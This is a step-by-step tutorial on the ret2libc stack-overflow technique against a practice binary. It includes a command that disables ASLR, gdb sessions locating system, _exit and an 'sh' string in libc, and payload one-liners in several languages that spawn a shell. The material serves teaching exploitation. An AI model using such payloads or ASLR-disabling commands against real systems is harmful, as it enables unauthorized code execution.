0. This is a step-by-step description of how to use ret2libc technique for
exploitation of buffers on the stack. Note, that ASLR must be disabled for
this technique to succeed:
   # echo 0 > /proc/sys/kernel/randomize_va_space

1. Try to overflow the buffer by gradually adding alphabet letters to the
exploitation stirng:
   $ ./vulnerable4 AAAA
   Going to copy 4 bytes to the buffer of size 4... Done!
   $ ./vulnerable4 AAAAAAAAAAAAAAAA
   Going to copy 16 bytes to the buffer of size 4... Done!
   $ ./vulnerable4 AAAAAAAAAAAAAAAABBBB
   Segmentation fault
   $ ./vulnerable4 AAAAAAAAAAAAAAAABBBBCCCC
   Segmentation fault

2. Let's check that CCCC is the return address:
   $ gdb --args ./vulnerable4 AAAAAAAAAAAAAAAABBBBCCCC
   (gdb) r
       Program received signal SIGSEGV, Segmentation fault.
       0x43434343 in ?? ()
So this means that ret instruction attempted to jump at the CCCC part of our
exploitation string, because 0x43 is the ASCII code of char C.

3. Find the addresses of system and exit functions in libc and "sh" string
somewhere in the data section of libc, which follows in memory after its
code section:
   $ gdb ./vulnerable4
   (gdb) b main
   (gdb) r
       Breakpoint 1, main:
   (gdb) p system
       $1 = 0xf7e4c850 <system>
   (gdb) p exit
       $2 = 0xf7e40800 <exit>
   (gdb) p _exit
       $3 = 0xf7ec35c5 <_exit>
   (gdb) find system,+10000000,"sh"
       0xf7f6cbb5
       0xf7f6d5c1
       0xf7f6f7cd
       0xf7f71323
       4 patterns found.

Note, that exit address is not suitable for our purpose, because it contains
null byte, but _exit function's address is fine.

Note also that due to little endian x86 architecture we need to reverse the
bytes in the address values.

The system's address will be popped off the stack by ret instruction and
execution will be transferred there, leaving the tail of our exploitation string
on top of the stack. And there we will have an exit's address, followed by the
pointer to "sh" string. exit function's address will act as a 'previously saved'
return address to be called after system() will finish. And pointer to "sh" will
pretend to be the first parameter for the system function call, as if it was
pushed there by the C code:
   system("sh");
   exit(); /* with whatever 4-byte value that is on the top of the stack, */
           /* in this case we do not care*/

So, again, it will look like this:
   AAAAAAAAAAAAAAAABBBB\x50\xc8\xe4\xf7\xc5\x35\xec\xf7\xb5\xcb\xf6\xf7
                       \______ ______/ \______ ______/ \______ ______/
                              V               V               V
                        slot1,system()  slot2,_exit()   slot3,"sh"

Considering the call and ret descriptions below, here what is going to happen:
   On return from vulnerable4!vuln function the address from slot1 will be
fetched into eip and esp will be increased to point to slot2. Then a jmp eip
will simply transfer execution to this address, being the start address of
libc!system() function. This function's code will search for its first and only
parameter in the slot3, according to the inner logic of call addr instruction
described below. And after system() function will be finished, i.e. we will
exit the shell from command line, the return address from slot2 will obtain
control, being the exit() function, and taking as its parameter the next
4 bytes from the stack, which we don't care about now.

call addr instruction performs:
    push eip       ; esp-=4
    jmp addr

ret instruction performs:
    pop eip        ; esp +=4
    jmp eip

4. Prepare shellcode string in ASCII form and pass it to the vulnerable program:
   $ ./vulnerable4 `printf 'A%.0s' {1..20} && printf "\x50\xc8\xe4\xf7\xc5\x35\xec\xf7\xb5\xcb\xf6\xf7"`
   $ ./vulnerable4 `python -c 'print "A"*20 + "\x50\xc8\xe4\xf7\xc5\x35\xec\xf7\xb5\xcb\xf6\xf7"'`
   $ ./vulnerable4 `ruby -e 'print "A"*20 + "\x50\xc8\xe4\xf7\xc5\x35\xec\xf7\xb5\xcb\xf6\xf7"'`
   $ ./vulnerable4 `perl -e 'print "A"x20 . "\x50\xc8\xe4\xf7\xc5\x35\xec\xf7\xb5\xcb\xf6\xf7"'`
   $ ./vulnerable4 `php -r 'echo str_repeat("A",20) . "\x50\xc8\xe4\xf7\xc5\x35\xec\xf7\xb5\xcb\xf6\xf7";'`
   $ ./vulnerable4 AAAAAAAAAAAAAAAABBBB`echo "50c8e4f7c535ecf7b5cbf6f7" | xxd -r -p`

5. Debug and troubleshoot if needed:
   $ gdb --args ./build/vulnerable4 \
       AAAAAAAAAAAAAAAABBBB`echo "50c8e4f7c535ecf7b5cbf6f7" | xxd -r -p`
   (gdb) ctrl+x,2
   (gdb) b vuln
   (gdb) r
   (gdb) n (until step over strcpy call)
   (gdb) si (until step over ret instruction)

check current program counter:
   (gdb) p system
       $1 = 0xf7e4c850 <system>
this address must be the same as current eip

check smashed stack:
   x/20xw $esp-12
       0xffffdbb4:     0x41414141      0x42424242      0xf7e4c850      0xf7ec35c5
       0xffffdbc4:     0xf7f6cbb5      0x00000000      0xf7e2a286      0x00000002
0x41414141 is AAAA
0x42424242 is BBBB
next should be system, exit and pointer to "sh", so let's check it:
   (gdb) info symbol 0xf7e4c850
       system in section .text of /lib32/libc.so.6
   (gdb) info symbol 0xf7ec35c5
       _exit in section .text of /lib32/libc.so.6
   (gdb) x/s *((char**)($esp+4))
       0xf7f6cbb5:     "sh"
